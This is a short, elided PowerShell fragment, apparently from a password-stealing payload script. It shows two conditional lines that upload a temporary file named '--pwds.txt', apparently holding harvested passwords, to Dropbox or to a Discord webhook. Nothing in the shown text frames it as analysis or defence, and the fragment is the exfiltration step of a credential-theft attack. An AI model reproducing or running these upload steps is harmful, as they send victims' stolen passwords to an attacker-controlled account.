...
if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--pwds.txt}
...
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--pwds.txt"}
